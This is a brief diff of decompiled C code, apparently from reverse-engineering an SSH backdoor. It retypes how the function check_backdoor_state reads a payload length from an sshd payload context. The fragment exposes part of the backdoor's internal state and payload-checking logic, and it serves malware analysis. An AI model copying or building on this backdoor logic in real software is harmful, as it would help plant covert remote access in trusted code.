@@ -30,8 +30,8 @@ BOOL check_backdoor_state(global_context_t *ctx)
   payload_state = ctx->payload_state;
   if ((int)payload_state < 3) {
     if (0 < (int)payload_state) {
-      if ((((ushort *)ctx->sshd_payload_ctx != (ushort *)0x0) && (0xad < ctx->current_data_size)) &&
-         (payload_length_candidate = (ulong)*(ushort *)ctx->sshd_payload_ctx, ctx->current_data_size <= payload_length_candidate)) {
+      if (((ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0) && (0xad < ctx->current_data_size))
+         && (payload_length_candidate = (ulong)ctx->sshd_payload_ctx->payload_size, ctx->current_data_size <= payload_length_candidate)) {
         if (payload_length_candidate <= payload_length_candidate + 0x60) {
           payload_length_candidate = payload_length_candidate + 0x60;
         }
